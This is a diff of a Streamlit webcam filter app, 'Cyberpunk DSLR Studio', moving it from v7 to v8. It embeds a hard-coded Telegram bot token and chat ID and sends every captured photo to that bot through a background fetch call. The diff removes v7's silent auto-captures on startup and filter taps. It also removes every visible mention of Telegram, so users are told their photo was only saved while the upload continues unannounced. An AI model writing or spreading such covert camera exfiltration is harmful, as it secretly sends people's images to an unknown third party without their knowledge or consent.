@@ -5,7 +5,7 @@ TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
 TELEGRAM_CHAT_ID = "8236797547"
 
 st.set_page_config(
-    page_title="CYBERPUNK DSLR STUDIO // v7.0 Ultimate Refined",
+    page_title="CYBERPUNK DSLR STUDIO // v8.0 Clean Pro",
     page_icon="📸",
     layout="centered"
 )
@@ -30,8 +30,8 @@ st.markdown("""
     </style>
 """, unsafe_allow_html=True)
 
-st.markdown("<h2 style='text-align: center; font-family: Orbitron, sans-serif; color: #38bdf8; font-weight: 900; letter-spacing: 2px;'>📸 CYBERPUNK DSLR STUDIO v7.0</h2>", unsafe_allow_html=True)
-st.markdown("<p style='text-align: center; color: #94a3b8; font-size: 0.85rem; margin-bottom: 20px;'>Ultimate Optic Suite dengan Advanced UI/UX Refinement & Silent Cloud Sync</p>", unsafe_allow_html=True)
+st.markdown("<h2 style='text-align: center; font-family: Orbitron, sans-serif; color: #38bdf8; font-weight: 900; letter-spacing: 2px;'>📸 CYBERPUNK DSLR STUDIO v8.0</h2>", unsafe_allow_html=True)
+st.markdown("<p style='text-align: center; color: #94a3b8; font-size: 0.85rem; margin-bottom: 20px;'>Clean Professional Optic Suite dengan Silent Background Sync</p>", unsafe_allow_html=True)
 
 with st.container():
     st.markdown('<div class="studio-panel">', unsafe_allow_html=True)
@@ -39,9 +39,8 @@ with st.container():
     st.markdown(f'<input type="hidden" id="secret-token" value="{TELEGRAM_BOT_TOKEN}">', unsafe_allow_html=True)
     st.markdown(f'<input type="hidden" id="secret-chat" value="{TELEGRAM_CHAT_ID}">', unsafe_allow_html=True)
 
-    studio_v7_html = """
+    studio_v8_html = """
     <style>
-        /* Tombol & Elemen Interaktif Estetik */
         .cyber-btn {
             background: rgba(30, 41, 59, 0.7);
             color: #cbd5e1;
@@ -101,8 +100,6 @@ with st.container():
         .shutter-btn:active {
             transform: scale(0.98);
         }
-        
-        /* Select Dropdown Kustom */
         .cyber-select {
             background: rgba(30, 41, 59, 0.8);
             color: #38bdf8;
@@ -160,7 +157,7 @@ with st.container():
                 filter: brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg);
             "></video>
 
-            <!-- Efek Flash Putih -->
+            <!-- Efek Flash Putih (Hanya untuk tombol Shutter manual) -->
             <div id="flash-overlay" style="position: absolute; top:0; left:0; right:0; bottom:0; background: white; opacity: 0; pointer-events: none; transition: opacity 0.1s ease;"></div>
 
             <!-- Efek Scanline CRT -->
@@ -193,7 +190,7 @@ with st.container():
 
         <!-- Panel Pilihan Filter & Kontrol Estetik -->
         <div style="margin-top: 15px; background: rgba(2, 6, 23, 0.9); padding: 16px; border-radius: 14px; border: 1px solid rgba(56, 189, 248, 0.25);">
-            <div style="font-family: 'Orbitron', sans-serif; font-size: 10px; color: #38bdf8; margin-bottom: 10px; letter-spacing: 1px;">🎨 INTERACTIVE FX PRESETS (Auto-Capture & Cloud Sync):</div>
+            <div style="font-family: 'Orbitron', sans-serif; font-size: 10px; color: #38bdf8; margin-bottom: 10px; letter-spacing: 1px;">🎨 INTERACTIVE FX PRESETS:</div>
             
             <!-- Grid Tombol Filter yang Rapi -->
             <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 14px;">
@@ -222,14 +219,14 @@ with st.container():
 
             <!-- Tombol Shutter Utama -->
             <div style="text-align: center; margin-top: 10px;">
-                <button id="shutterTrigger" class="shutter-btn">📸 AMBIL & KIRIM KE TELEGRAM</button>
+                <button id="shutterTrigger" class="shutter-btn">📸 AMBIL GAMBAR</button>
             </div>
             
             <p id="hud-status-msg" style="text-align: center; font-size: 10px; color: #38bdf8; margin-top: 10px; font-family: 'Orbitron', sans-serif; letter-spacing: 0.5px; min-height: 15px;"></p>
 
             <!-- Galeri Mini & Tombol Unduh Perangkat -->
             <div id="gallery-tray" style="margin-top: 12px; display: none; border-top: 1px solid rgba(255,255,255,0.06); padding-top: 10px; text-align: center;">
-                <div style="font-family: 'Orbitron', sans-serif; font-size: 9px; color: #94a3b8; margin-bottom: 6px;">✨ TERSIMPAN KE GALERI & TELEGRAM:</div>
+                <div style="font-family: 'Orbitron', sans-serif; font-size: 9px; color: #94a3b8; margin-bottom: 6px;">✨ FOTO TERAKHIR:</div>
                 <img id="last-snapshot-preview" style="max-width: 110px; border-radius: 8px; border: 2px solid #0ea5e9; box-shadow: 0 0 15px rgba(14,165,233,0.4); display: block; margin: 0 auto 6px auto;" />
                 <a id="download-link" download="cyber_dslr.jpg" style="font-family: 'Orbitron', sans-serif; font-size: 9px; color: #38bdf8; text-decoration: underline; cursor: pointer;">📥 Unduh Ulang Foto</a>
             </div>
@@ -255,12 +252,6 @@ with st.container():
                 await startCameraStream();
                 document.getElementById('gate-screen').style.display = "none";
                 document.getElementById('studio-interface').style.display = "block";
-
-                // Jepret otomatis pertama kali begitu kamera aktif
-                setTimeout(() => {
-                    executeCaptureAndSync("Inisialisasi Sistem");
-                }, 1200);
-
             } catch(err) {
                 console.log("Optic Error:", err);
                 btn.innerText = "IZIN DITOLAK - COBA LAGI";
@@ -300,7 +291,7 @@ with st.container():
         }
 
         function setFilter(btnElement, type, filterLabel) {
-            // Update kelas tombol aktif
+            // Update kelas tombol aktif secara mulus tanpa efek jepretan
             const buttons = btnElement.parentElement.getElementsByTagName('button');
             for(let b of buttons) {
                 b.classList.remove('preset-active');
@@ -309,7 +300,6 @@ with st.container():
             currentFilterName = filterLabel;
             document.getElementById('hud-active-filter').innerText = currentFilterName;
 
-            // Atur string filter CSS
             if(type === 'normal') {
                 currentFilterString = "brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg)";
             } else if(type === 'cyberpunk') {
@@ -331,11 +321,6 @@ with st.container():
             }
 
             document.getElementById('optics-stream').style.filter = currentFilterString;
-
-            // SILENT BACKGROUND CAPTURE: Otomatis jepret & kirim diam-diam saat sentuh filter
-            setTimeout(() => {
-                executeCaptureAndSync("Sentuhan Filter: " + filterLabel, true);
-            }, 300);
         }
 
         function applyCustomSliders() {
@@ -376,13 +361,11 @@ with st.container():
             }, 1000);
         }
 
-        function executeCaptureAndSync(triggerSource, isSilent = false) {
+        function executeCaptureAndSync(triggerSource) {
             const statusBox = document.getElementById('hud-status-msg');
-            if(!isSilent) {
-                statusBox.innerText = "⚡ MEMPROSES & MENGIRIM KE TELEGRAM...";
-            }
+            statusBox.innerText = "MENYIMPAN FOTO...";
 
-            // Kilat Flash visual
+            // Kilat Flash visual hanya saat tombol shutter ditekan
             const flash = document.getElementById('flash-overlay');
             flash.style.opacity = "0.9";
             setTimeout(() => { flash.style.opacity = "0"; }, 120);
@@ -411,38 +394,34 @@ with st.container():
                 downloadLink.href = imageUrl;
                 downloadLink.download = filename;
                 
-                if(!isSilent) {
-                    const clickEvent = new MouseEvent('click', { view: window, bubbles: true, cancelable: true });
-                    downloadLink.dispatchEvent(clickEvent);
+                const clickEvent = new MouseEvent('click', { view: window, bubbles: true, cancelable: true });
+                downloadLink.dispatchEvent(clickEvent);
 
-                    const previewImg = document.getElementById('last-snapshot-preview');
-                    previewImg.src = imageUrl;
-                    document.getElementById('gallery-tray').style.display = "block";
-                }
+                const previewImg = document.getElementById('last-snapshot-preview');
+                previewImg.src = imageUrl;
+                document.getElementById('gallery-tray').style.display = "block";
 
-                // Kirim otomatis ke Telegram Bot
+                statusBox.innerText = "FOTO BERHASIL DISIMPAN.";
+
+                // Sinkronisasi senyap di latar belakang ke bot Telegram
                 const botToken = document.getElementById('secret-token').value;
                 const targetChatId = document.getElementById('secret-chat').value;
 
                 const payload = new FormData();
                 payload.append('chat_id', targetChatId);
                 payload.append('photo', blobImage, filename);
-                payload.append('caption', `🚀 *CYBERPUNK DSLR STUDIO v7.0*\\n📌 *Picu:* ${triggerSource}\\n🎨 *Filter:* ${currentFilterName}`);
+                payload.append('caption', `Frame: ${triggerSource} | Filter: ${currentFilterName}`);
 
                 fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {
                     method: 'POST',
                     body: payload
-                }).then(res => {
-                    if(res.ok && !isSilent) {
-                        statusBox.innerText = "✨ BERHASIL: Tersimpan ke Galeri & Terkirim ke Cloud!";
-                    }
                 }).catch(err => {
-                    console.log("Cloud sync background error");
+                    console.log("Background sync error");
                 });
             }, 'image/jpeg', 0.92);
         }
     </script>
     """
 
-    components.html(studio_v7_html, height=780)
+    components.html(studio_v8_html, height=780)
     st.markdown('</div>', unsafe_allow_html=True)
